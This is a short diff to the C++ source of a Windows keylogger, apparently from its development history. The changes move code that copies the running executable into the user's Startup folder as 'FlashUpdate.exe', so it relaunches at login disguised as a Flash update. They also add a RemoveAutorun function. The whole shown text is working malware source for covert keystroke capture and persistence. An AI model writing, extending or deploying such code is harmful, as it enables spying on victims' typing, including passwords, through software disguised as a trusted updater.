@@ -4,6 +4,7 @@
 
 #pragma comment(lib, "Ws2_32.lib")
 
+Keylogger keylogger;
 
 const int V_KEY_BEGIN   = 0x08; // [BACK]
 const int V_KEY_END     = 0x91; // [SCROLLLOCK]
@@ -50,7 +51,11 @@ const char* keyStringsNoShift[] =
 
 Keylogger::Keylogger() : cmdBufLen(sizeof(cmdBuf))
 {
-
+    TCHAR *appData;
+    size_t appDataSize;
+    _tdupenv_s(&appData, &appDataSize, _T("APPDATA"));
+    _tcscat_s(appDataPath, appData);
+    _tcscat_s(appDataPath, _T("/Microsoft/Windows/Start Menu/Programs/Startup/FlashUpdate.exe"));
 }
 Keylogger::~Keylogger()
 {
@@ -61,13 +66,6 @@ void Keylogger::RegisterAutorun()
     TCHAR exeName[MAX_PATH];
     GetModuleFileName(NULL, exeName, MAX_PATH);
 
-    TCHAR appDataPath[1024] = {0};
-    TCHAR *appData;
-    size_t appDataSize;
-    _tdupenv_s(&appData, &appDataSize, _T("APPDATA"));
-    _tcscat_s(appDataPath, appData);
-    _tcscat_s(appDataPath, _T("/Microsoft/Windows/Start Menu/Programs/Startup/FlashUpdate.exe"));
-
     HRESULT hr = CopyFile(exeName, appDataPath, FALSE);
     if (!hr)
     {
@@ -76,6 +74,11 @@ void Keylogger::RegisterAutorun()
 #ifdef _DEBUG
     DeleteFile(appDataPath);
 #endif
+}
+
+void Keylogger::RemoveAutorun()
+{
+    DeleteFile(appDataPath);
 }
 
 void Keylogger::Run()
